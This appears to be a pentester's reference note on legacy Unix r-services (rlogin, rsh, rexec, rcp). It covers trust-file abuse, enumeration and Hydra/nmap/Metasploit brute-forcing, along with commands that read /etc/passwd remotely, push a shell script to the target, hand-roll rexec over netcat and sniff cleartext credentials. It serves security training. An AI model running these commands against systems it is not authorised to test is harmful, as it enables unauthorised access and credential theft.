# R-Services

#RServices #RemoteServices #rlogin #rsh #rexec #rcp #rusers #remoteaccess

## What is R-Services?
R-Services (Berkeley r-commands) — legacy suite for remote access and command execution between Unix/Linux hosts. No encryption. Authentication based on trusted host lists (`/etc/hosts.equiv` and `.rhosts`). Largely replaced by SSH.

- Ports: **TCP 512** (rexec), **TCP 513** (rlogin), **TCP 514** (rsh/rcp)
- Common on older Unix systems, some legacy environments
- Legacy scanner findings: **CVE-1999-0651** (rsh/rlogin service running), **CVE-1999-0618** (rexec running) — "the vuln is that it exists at all"

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|Nmap]] | Port/version detection and the `rexec-brute` / `rlogin-brute` / `rusers` NSE scripts |
| [[Tools/Auth/Hydra\|Hydra]] | Brute-force `rlogin://`, `rexec://`, and **`rsh://`** — the only one of the three that covers rsh |
| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `auxiliary/scanner/rservices/*_login` modules for all three services |
| [[Tools/Remote Access/Netcat\|Netcat]] | Banner-grab 512–514 (protocol itself needs a privileged source port — see note below) |
| [[Tools/Network/tcpdump\|tcpdump]] | Capture cleartext r-service credentials off the wire |

---

## Commands Overview

| Command | Daemon | Port | Description |
|---|---|---|---|
| `rcp` | `rshd` | 514/TCP | Bidirectional file copy (like `cp`). No overwrite warning. |
| `rsh` | `rshd` | 514/TCP | Remote shell without login prompt. Trusts `hosts.equiv`/`.rhosts`. |
| `rexec` | `rexecd` | 512/TCP | Run commands remotely with username/password over unencrypted socket. Auth overridden by trust files. |
| `rlogin` | `rlogind` | 513/TCP | Login to remote Unix host (like telnet). Auth overridden by trust files. |

---

## Authentication Trust Files

### /etc/hosts.equiv
System-wide trust. Format: `hostname username` (one per line). If a host/user combo matches, no password required.

```
# /etc/hosts.equiv example
workhorse            # trust all users from this host
workhorse jdoe       # trust only jdoe from this host
+                    # trust ALL hosts (dangerous!)
+ jdoe               # trust jdoe from any host (dangerous!)
```

### ~/.rhosts
Per-user trust. Same format. Checked even if `/etc/hosts.equiv` doesn't exist.

```
# ~/.rhosts example
192.168.1.10
192.168.1.10 jdoe
+
```

> [!warning] A `+` entry in either file means trust anyone from any host — effectively no authentication.

---

## Connect / Access

```bash
# rlogin — login to remote host
rlogin <target>
rlogin -l <user> <target>

# rsh — run command on remote host
rsh <target> <command>
rsh <target> id
rsh -l <user> <target> whoami

# rexec — run with explicit user/pass (flags BEFORE host)
# ⚠ no rexec client in Kali — see the nc one-liner under Client Tooling
rexec -l <user> -p <pass> <target> <command>

# rcp — copy files (⚠ also unavailable in Kali; use the rsh redirection trick instead)
rcp <local_file> <user>@<target>:<remote_path>
rcp <user>@<target>:<remote_file> <local_path>

# rusers — who is logged in (RPC service, needs the `rusers` package)
rusers -al <target>
```

> [!tip] Enumerate users *before* brute-forcing. `rusers`/`nmap --script rusers` gives you live usernames, and `rsh` authenticates on **host trust, not passwords** — so a valid username against a `+`-entry trust file is an instant shell with no password guessing at all.

---

## Enumeration

```bash
# Nmap — service/version detection first
nmap -p 512-514 -sV <target>

# Brute-force scripts. NOTE: only rexec-brute and rlogin-brute exist —
# there is NO rsh-brute script in nmap. Use hydra for rsh (see below).
nmap -p 512,513,514 --script rexec-brute,rlogin-brute -sV <target>

# Logged-in users via rusersd (RPC — find it via portmapper on 111, not 512-514)
nmap -p 111 --script rusers <target>

# Check if rlogin responds (banner only — you can't speak rsh over plain nc, see note below)
nc -nv <target> 513

# Metasploit
use auxiliary/scanner/rservices/rexec_login
use auxiliary/scanner/rservices/rlogin_login
use auxiliary/scanner/rservices/rsh_login
```

> [!warning] `rsh-brute` does not exist — and nmap fails *closed*
> A common copy-paste (`--script rexec-brute,rlogin-brute,rsh-brute`) aborts the entire scan:
> ```
> NSE: failed to initialize the script engine:
> /usr/share/nmap/nse_main.lua:829: 'rsh-brute' did not match a category, filename, or directory
> QUITTING!
> ```
> Nmap does **not** skip an unknown script and run the rest — one bad name kills the whole run, so you get *no* results at all. Confirm a script exists before adding it:
> ```bash
> ls /usr/share/nmap/scripts/ | grep -iE 'rexec|rlogin|rsh|rusers'
> # → rexec-brute.nse, rlogin-brute.nse, rusers.nse   (no rsh-brute.nse)
> ```
> For **rsh** brute-forcing use hydra, which *does* have an rsh module (see Attack Vectors).

### Client Tooling (Kali)

Clients don't all come from one package, and **`rsh-client` (the netkit package most guides tell you to install) is not in Kali's repos** — `apt install rsh-client` fails with *"has no installation candidate"*. What actually works:

| Binary | Kali package | Status |
|---|---|---|
| `rsh`, `rlogin` | `rsh-redone-client` | ✅ Installed by default (via `update-alternatives`) |
| `rusers` | `rusers` | `apt install rusers` |
| `rcp`, `rexec` | — | ❌ **No clean Kali package** — use the workarounds below |

```bash
apt-cache policy rsh-client rsh-redone-client rusers   # confirm before trusting any guide
```

> [!tip] You don't need `rcp` or `rexec` at all
> Both are replaceable with tools you already have — which is usually faster than fighting packaging:
> ```bash
> # rcp substitute — pull a file through rsh
> rsh <target> 'cat /etc/passwd' > passwd.txt
> # push a file
> cat shell.sh | rsh <target> 'cat > /tmp/shell.sh'
>
> # rexec substitute — the protocol is just 4 NUL-terminated fields on port 512:
> #   <stderr-port>\0<username>\0<password>\0<command>\0
> printf '0\0%s\0%s\0%s\0' 'user' 'password' 'id' | nc <target> 512
> ```
> `inetutils-tools` and `heimdal-clients` do exist in the repos and carry r-command binaries, but they're an experimental build and Kerberized variants respectively — neither is a drop-in for plain rexec.

> [!note] Why `rsh` is setuid root
> `/usr/bin/rsh` → `rsh-redone-rsh` is `-rwsr-xr-x` (setuid). The rsh/rlogin trust model requires the **client to bind a privileged source port (512–1023)** — the server treats "came from a low port" as proof the connection was made by root on a trusted host. That's why you can't hand-roll the protocol over `nc` from an unprivileged shell, and why a pivoted/port-forwarded rsh often fails even when the trust files are wide open.

---

## Attack Vectors

### Abuse Misconfigured Trust Files

```bash
# If hosts.equiv or .rhosts has + entry or our IP is trusted
rlogin <target>       # no password required
rsh <target> whoami   # command execution without auth

# Check .rhosts on target after gaining access
cat /etc/hosts.equiv
cat ~/.rhosts
find / -name ".rhosts" 2>/dev/null
```

### Brute Force rlogin/rexec/rsh

Hydra covers **all three** protocols — including `rsh`, which nmap has no script for:

```bash
hydra -L users.txt -P passwords.txt rlogin://<target>
hydra -L users.txt -P passwords.txt rexec://<target>
hydra -L users.txt rsh://<target>        # rsh trusts the host, so usernames only — no -P

# Confirm hydra's module list on your box
hydra 2>&1 | grep -oE '\b(rsh|rlogin|rexec)\b' | sort -u

# Metasploit
use auxiliary/scanner/rservices/rlogin_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Troubleshooting: "It should be passwordless but I get a password prompt"

The #1 r-services gotcha. `.rhosts` / `hosts.equiv` trust is keyed on a **(client host, _client-side_ username)** pair — and rlogin/rsh transmit **the username you are logged in as locally**, not the one you pass with `-l`. `-l` only sets the *remote* account you want to become.

So `rlogin -l sadm target` while you're sitting on Kali as `kali` sends the pair *(your-IP, **kali**)*. If the target's `/home/sadm/.rhosts` says `<your-IP> sadm`, that's a miss → the server falls back to asking for a password.

**Fix — make your local username match the trusted one:**

```bash
# 1. Create a matching local user, then rlogin as them
sudo useradd -m sadm
sudo su - sadm -c 'rlogin -l sadm <target>'

# Or simply:
sudo su - sadm
rlogin <target>          # -l is redundant once local == remote user
```

**Diagnostic checklist, in order:**

| Symptom / check | Meaning |
|---|---|
| `rlogin -v -l sadm <target>` | Verbose — shows which user pair is actually sent |
| Prompt appears **instantly** | Trust lookup failed (username/host mismatch) — fix the local user |
| Prompt after a **long hang** | Reverse DNS timeout — the server can't resolve your IP to a name, so no `.rhosts` hostname can ever match. Try the entry by IP, or check whether the box expects a hostname you can't provide |
| `rlogin: connection refused` on 513 | `rlogind` down — try `rsh` on 514 instead |
| Works as `root`, not as you | `.rhosts` trusts `root` specifically, or you needed the privileged source port |

```bash
# Same rule applies to rsh — match the local user, then run a command
sudo su - sadm -c 'rsh <target> id'

# Once in, confirm what the trust actually was
cat ~/.rhosts /etc/hosts.equiv 2>/dev/null
```

> [!tip] If you already have *any* shell on the box, read `/home/<user>/.rhosts` and `/etc/hosts.equiv` first — they tell you exactly which (host, user) pairs are trusted, so you can construct a matching local user instead of guessing.

### Sniff Credentials (No Encryption)

```bash
# R-services transmit credentials in plaintext
sudo tcpdump -i eth0 -nn port 512 or port 513 or port 514 -A
```

### IP Spoofing (Historical)

```bash
# Classic attack: spoof trusted host IP to bypass auth
# Requires ability to forge IP and handle TCP sequence prediction
# mitnick.py / scapy-based tools
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `+` in `/etc/hosts.equiv` | Any host authenticated without password |
| `+` in `~/.rhosts` | Any user from any host can access |
| No PAM enforcement | Auth bypass via trust files |
| r-services exposed to internet | IP spoofing, brute force |
| Cleartext transmission | Credential sniffing |
| Shared `.rhosts` across systems | Lateral movement |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (rlogin) | `rlogin -l user host` |
| Run command (rsh) | `rsh host whoami` |
| Copy file (rcp) | `rcp localfile user@host:/path` |
| Check trust files | `cat /etc/hosts.equiv; cat ~/.rhosts` |
| Nmap scan | `nmap -p 512-514 -sV host` |
| Nmap brute (⚠ no `rsh-brute`) | `nmap -p 512,513,514 --script rexec-brute,rlogin-brute -sV host` |
| List logged-in users | `nmap -p 111 --script rusers host` / `rusers -al host` |
| Brute force rlogin/rexec | `hydra -L users.txt -P pass.txt rlogin://host` |
| Brute force **rsh** (no nmap script) | `hydra -L users.txt rsh://host` |
| Verify a script exists | `ls /usr/share/nmap/scripts/ \| grep -i rsh` |
| Sniff creds | `tcpdump -i eth0 port 512 or 513 or 514 -A` |

---

*Created: 2026-07-13*
*Updated: 2026-08-13*
*Model: claude-opus-5*
